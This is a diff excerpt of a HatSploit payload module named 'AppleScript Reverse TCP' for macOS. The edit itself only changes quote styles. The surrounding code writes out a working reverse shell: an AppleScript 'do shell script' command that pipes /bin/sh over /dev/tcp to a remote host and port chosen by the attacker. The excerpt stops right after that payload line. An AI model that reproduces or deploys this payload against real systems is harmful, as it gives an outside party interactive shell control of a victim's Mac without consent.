@@ -8,19 +8,19 @@ from hatsploit.lib.payload import Payload
 
 class HatSploitPayload(Payload):
     details = {
-        "Name": "AppleScript Reverse TCP",
-        "Payload": "macos/applescript/shell_reverse_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "AppleScript reverse TCP payload.",
-        "Architecture": "applescript",
-        "Platform": "macos",
-        "Rank": "high",
-        "Type": "reverse_tcp",
+        'Name': "AppleScript Reverse TCP",
+        'Payload': "macos/applescript/shell_reverse_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "AppleScript reverse TCP payload.",
+        'Architecture': "applescript",
+        'Platform': "macos",
+        'Rank': "high",
+        'Type': "reverse_tcp",
     }
 
     def run(self):
-        remote_host = self.handler["RHOST"]
-        remote_port = self.handler["RPORT"]
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         payload = (
             f'do shell script "/bin/sh &>/dev/tcp/{remote_host}/{remote_port} 0>&1 &"'
